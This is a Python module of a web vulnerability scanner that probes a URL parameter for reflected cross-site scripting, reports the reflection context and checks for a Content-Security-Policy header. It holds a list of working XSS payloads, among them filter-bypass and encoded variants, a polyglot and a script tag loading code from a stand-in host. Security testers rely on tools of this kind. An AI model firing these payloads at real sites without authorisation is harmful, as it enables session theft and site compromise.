"""
Reflected XSS scanner module.

Sends a list of XSS payloads against a target parameter and checks
whether the payload is reflected unescaped in the response — a strong
signal of a reflected XSS vulnerability. Also reports the reflection
context (HTML body, inside an attribute, inside a script block) and
whether a Content-Security-Policy header is present, since both affect
whether a finding is actually exploitable in a browser.
"""

import re
import urllib.parse
import uuid

from core.http_client import HTTPClient
from core.report import Report

DEFAULT_PAYLOADS = [
    # Basic script injection
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<script src=//evil.test/x.js></script>",

    # Event-handler based (no <script> tag needed)
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",

    # Breaking out of an HTML attribute
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "\" onmouseover=alert(1) x=\"",
    "' onmouseover=alert(1) x='",

    # Breaking out of a JS string context (e.g. var x = 'INPUT';)
    "';alert(1);//",
    "\";alert(1);//",
    "</script><script>alert(1)</script>",

    # href / src / javascript: URI context
    "javascript:alert(1)",
    "<a href=javascript:alert(1)>click</a>",

    # Simple filter-bypass variations
    "<ScRiPt>alert(1)</sCriPt>",
    "<img src=x onerror=\"alert(1)\">",
    "<img src=x onerror=alert`1`>",
    "<svg/onload=alert(1)>",

    # Encoded / obfuscated
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",

    # Polyglot — reflects in several contexts at once
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
]


def detect_context(response_text, payload):
    idx = response_text.find(payload)
    if idx == -1:
        return "unknown"

    window_start = max(0, idx - 100)
    before = response_text[window_start:idx]

    # Inside a <script>...</script> block: look for the nearest
    # unclosed <script> tag before the reflection point.
    last_script_open = before.rfind("<script")
    last_script_close = before.rfind("</script>")
    if last_script_open != -1 and last_script_open > last_script_close:
        return "inside <script> block"

    # Inside an HTML attribute: reflection sits right after an
    # unclosed quote that opened an attribute value, e.g. value="HERE.
    if re.search(r'=["\']\s*$', before):
        return "inside an HTML attribute value"

    return "HTML body (plain text/tag content)"


def detect_csp(response):
    """Return the CSP header value if present, or None."""
    return response.headers.get("Content-Security-Policy")


def build_payloads(marker):
    """Attach a unique marker to each payload so a reflection can be
    tied back to the exact payload that caused it, even if the page
    HTML-encodes some characters but not others."""
    return [f"{p}<!--{marker}-->" if "<" in p else f"{p}{marker}" for p in DEFAULT_PAYLOADS]


def run(args, client: HTTPClient):
    marker = uuid.uuid4().hex[:8]
    payloads = args.payloads or build_payloads(marker)
    report = Report("xss")

    print(f"[*] Scan start: {args.url} (Parameter: {args.param})")
    print(f"[*] Payloads to try: {len(payloads)}\n")

    for payload in payloads:
        if args.method.upper() == "GET":
            target_url = f"{args.url}?{args.param}={urllib.parse.quote(payload)}"
            response = client.get(target_url)
        else:
            response = client.post(args.url, data={args.param: payload})

        if response is None:
            continue

        if payload in response.text:
            csp = detect_csp(response)
            context = detect_context(response.text, payload)
            note = "unescaped reflection in response body"
            if csp:
                note += " — CSP header present, may block execution in a browser"
            report.add_finding(
                payload=payload,
                url=response.url,
                context=context,
                note=note,
                csp=csp or "none",
            )

    report.summarize()
    return report
